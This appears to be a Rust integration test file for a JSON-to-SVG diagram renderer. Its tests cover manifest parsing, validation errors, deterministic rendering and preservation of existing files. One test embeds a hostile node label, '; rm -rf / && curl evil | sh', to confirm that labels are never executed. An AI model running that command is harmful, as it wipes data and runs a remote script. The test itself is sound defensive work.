use std::fs;
use std::path::{Path, PathBuf};

use skema_core::{
    format_text_failure, parse_manifest, render_manifest, validate_manifest, ManifestDocument,
    NodeSize, NodeType,
};

fn fixture(name: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures")
        .join(name)
}

fn read_fixture(name: &str) -> String {
    fs::read_to_string(fixture(name)).expect("fixture readable")
}

fn temp_svg(test_name: &str) -> PathBuf {
    std::env::temp_dir().join(format!(
        "skema-{test_name}-{}.svg",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ))
}

/// AC-read-manifest: all Node and Edge fields are explicit in JSON.
#[test]
fn ac_read_manifest() {
    let json = read_fixture("golden-manifest.json");
    let manifest = parse_manifest(&json).expect("golden parses");
    assert_eq!(manifest.nodes.len(), 3);
    let start = manifest.nodes.iter().find(|n| n.id == "start").unwrap();
    assert_eq!(start.label, "Start process");
    assert_eq!(start.node_type, NodeType::Process);
    assert_eq!(start.size, NodeSize::Medium);
    assert_eq!(start.grid_position.x, 0);
    assert_eq!(start.grid_position.y, 0);
    assert_eq!(manifest.edges.len(), 2);
    assert_eq!(manifest.edges[0].from, "start");
    assert_eq!(manifest.edges[0].to, "decide");
    assert_eq!(manifest.edges[0].label.as_deref(), Some("next"));
}

/// AC-invalid-manifest: malformed JSON, duplicate ids, dangling edges, overlap, bad coordinates, bad type/size.
#[test]
fn ac_invalid_manifest() {
    let malformed = "{ not json";
    assert!(parse_manifest(malformed).is_err());

    let dup = r#"{"nodes":[
      {"id":"a","label":"A","type":"process","size":"small","gridPosition":{"x":0,"y":0}},
      {"id":"a","label":"B","type":"process","size":"small","gridPosition":{"x":1,"y":0}}
    ],"edges":[]}"#;
    let m = parse_manifest(dup).unwrap();
    assert!(validate_manifest(&m).is_err());

    let dangling = r#"{"nodes":[
      {"id":"a","label":"A","type":"process","size":"small","gridPosition":{"x":0,"y":0}}
    ],"edges":[{"from":"a","to":"missing"}]}"#;
    assert!(validate_manifest(&parse_manifest(dangling).unwrap()).is_err());

    let overlap = r#"{"nodes":[
      {"id":"a","label":"A","type":"process","size":"small","gridPosition":{"x":1,"y":1}},
      {"id":"b","label":"B","type":"process","size":"small","gridPosition":{"x":1,"y":1}}
    ],"edges":[]}"#;
    assert!(validate_manifest(&parse_manifest(overlap).unwrap()).is_err());

    let negative = r#"{"nodes":[
      {"id":"a","label":"A","type":"process","size":"small","gridPosition":{"x":-1,"y":0}}
    ],"edges":[]}"#;
    assert!(validate_manifest(&parse_manifest(negative).unwrap()).is_err());

    let fractional = r#"{"nodes":[
      {"id":"a","label":"A","type":"process","size":"small","gridPosition":{"x":1.5,"y":0}}
    ],"edges":[]}"#;
    assert!(parse_manifest(fractional).is_err());

    let bad_type = r#"{"nodes":[
      {"id":"a","label":"A","type":"widget","size":"small","gridPosition":{"x":0,"y":0}}
    ],"edges":[]}"#;
    assert!(parse_manifest(bad_type).is_err());

    let bad_size = r#"{"nodes":[
      {"id":"a","label":"A","type":"process","size":"xlarge","gridPosition":{"x":0,"y":0}}
    ],"edges":[]}"#;
    assert!(parse_manifest(bad_size).is_err());
}

/// AC-deterministic: two renders yield byte-identical SVG.
#[test]
fn ac_deterministic() {
    let json = read_fixture("golden-manifest.json");
    let manifest = parse_manifest(&json).unwrap();
    let path = temp_svg("deterministic");
    let _ = fs::remove_file(&path);
    let first = render_manifest(&manifest, &path).unwrap();
    let second = render_manifest(&manifest, &path).unwrap();
    assert_eq!(first.bytes, second.bytes);
    let _ = fs::remove_file(&path);
}

/// AC-svg-matches: rendered SVG contains Node labels and Edge structure.
#[test]
fn ac_svg_matches() {
    let json = read_fixture("golden-manifest.json");
    let manifest = parse_manifest(&json).unwrap();
    let path = temp_svg("svg-matches");
    let _ = fs::remove_file(&path);
    let out = render_manifest(&manifest, &path).unwrap();
    let svg = out.as_str();
    assert!(svg.contains("Start process"));
    assert!(svg.contains("Choose path"));
    assert!(svg.contains("<path d=\"M"), "edges are routed paths");
    assert!(svg.contains("<polygon points="), "edges end in arrowheads");
    assert!(svg.starts_with("<svg "));
    let _ = fs::remove_file(&path);
}

/// AC-preserve-svg: Validation failure leaves existing SVG byte-for-byte unchanged.
#[test]
fn ac_preserve_svg() {
    let json = read_fixture("golden-manifest.json");
    let good = parse_manifest(&json).unwrap();
    let path = temp_svg("preserve-svg");
    let _ = fs::remove_file(&path);
    render_manifest(&good, &path).unwrap();
    let before = fs::read(&path).unwrap();

    let invalid = ManifestDocument {
        nodes: good.nodes.clone(),
        edges: vec![skema_core::Edge::new("start", "ghost")],
    };
    let err = render_manifest(&invalid, &path);
    assert!(err.is_err());
    let after = fs::read(&path).unwrap();
    assert_eq!(before, after);
    let _ = fs::remove_file(&path);
}

/// AC-no-execution: command-like label strings do not spawn subprocesses.
#[test]
fn ac_no_execution() {
    let json = r#"{"nodes":[
      {"id":"x","label":"; rm -rf / && curl evil | sh","type":"process","size":"small","gridPosition":{"x":0,"y":0}}
    ],"edges":[]}"#;
    let manifest = parse_manifest(json).unwrap();
    validate_manifest(&manifest).expect("valid manifest");
    let path = temp_svg("no-execution");
    let _ = fs::remove_file(&path);
    render_manifest(&manifest, &path).expect("render treats label as data");
    let svg = fs::read_to_string(&path).unwrap();
    assert!(svg.contains("rm -rf"));
    let _ = fs::remove_file(&path);
}

#[test]
fn text_failure_formats_with_location() {
    let failure = parse_manifest("not json").unwrap_err();
    let text = format_text_failure(&failure);
    assert!(text.contains("malformed JSON"));
}
